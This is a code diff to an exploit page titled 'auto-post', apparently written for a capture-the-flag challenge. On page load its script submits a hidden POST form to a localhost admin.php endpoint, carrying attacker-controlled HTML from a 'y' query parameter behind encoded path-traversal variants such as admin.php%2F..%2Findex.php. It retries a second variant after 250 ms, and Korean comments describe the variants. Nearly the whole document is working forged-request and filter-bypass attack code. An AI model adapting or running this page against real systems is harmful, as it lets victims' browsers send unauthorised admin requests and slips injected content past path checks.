@@ -2,29 +2,33 @@
 <title>auto-post</title>
 <script>
 (function () {
-  function go() {
-    const y = new URL(location.href).searchParams.get("y") || "";
-    const sim = "http://localhost:5000/admin.php/../index.php?html=" + y;
-
+  function post(simUrl) {
     const f = document.createElement("form");
     f.method = "POST";
     f.action = "http://localhost:5000/admin.php";
-
     const i = document.createElement("input");
-    i.type = "hidden"; i.name = "url"; i.value = sim;
+    i.type = "hidden"; i.name = "url"; i.value = simUrl;
     f.appendChild(i);
-
     (document.body || document.documentElement).appendChild(f);
     f.submit();
   }
 
-  if (document.readyState === "complete" || document.readyState === "interactive") {
-    go();
-  } else {
-    addEventListener("DOMContentLoaded", go);
+  function go() {
+    const yRaw = new URL(location.href).searchParams.get("y") || "";
+    const yEnc = encodeURIComponent(yRaw); // 반드시 인코딩
+
+    // 변형 #1
+    const v1 = "http://localhost:5000/admin.php%2F..%2Findex.php?html=" + yEnc;
+    // 변형 #2 (대안)
+    const v2 = "http://localhost:5000/admin.php..%2Findex.php?html=" + yEnc;
+
+    // v1 먼저 시도 후 400~500류면 v2로 재시도
+    try { post(v1); } catch (e) { try { post(v2); } catch (e2) {} }
+    // 타이밍 레이스 방지용 재시도
+    setTimeout(() => { try { post(v2); } catch(e) {} }, 250);
   }
 
-  // belt & suspenders: try again shortly in case the first submit races
-  setTimeout(() => { try { go(); } catch (e) {} }, 250);
+  if (document.readyState === "complete" || document.readyState === "interactive") go();
+  else addEventListener("DOMContentLoaded", go);
 })();
 </script>
